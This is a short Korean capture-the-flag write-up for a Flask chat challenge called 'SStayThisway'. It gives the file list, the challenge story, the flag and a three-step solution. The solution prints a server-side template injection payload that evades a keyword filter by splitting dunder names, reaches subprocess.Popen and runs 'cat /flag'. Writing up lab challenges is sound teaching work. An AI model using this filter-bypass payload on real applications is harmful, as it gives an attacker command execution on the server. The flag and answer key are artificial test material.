## SStayThisway

✔ **compose**

```
[player]
- None

[server]
- honey.gif (desc)
- static/
- templates/
- app.py
- flag
- README.md
```

✔ **description**

```
국내 대기업 로우브에서 새로 런칭한 채팅 서비스, 퍼플이에요!

퍼플에는 팬이 아티스트에게 질문하며 보물을 찾는 보물 찾기 이벤트가 있어요.

그런데 장난기가 발동한 한 아이돌이 대답 대신 모든 채팅을 따라하기만 한대요 ~

괜히 승부욕이 생기게 하는 내 최애... 따라하는것을 "우회"해서 "보물"을 찾아주세요!!

뜨르흐지믈르그!!!

보물 위치: /flag
```

✔ **flag**

```
KCTF{pr0m1s3_9_f0r3v3r_!!>_<}
```

✔ **write-up**

```
정말 간단한 SSTI 문제.

필터링이 되어있는데, 필터링 값들은 "해킹은 나쁜거야!!"라고 알려준다.

1. "해킹은 나쁜거야!!"를 역으로 이용해 필터링 값들을 찾아내준다.

{{ ''['__cl'+'ass__']['__m'+'ro__'][1]['__subcla'+'sses__']() }}

2. 필터링 우회해서 Popen의 위치 찾아준다.

{{ ''['__cl'+'ass__']['__m'+'ro__'][1]['__subcla'+'sses__']()[<popen location>]('cat /flag', shell=True, stdout=-1).communicate() }}

3. /flag 값 얻어내면 끝!
```
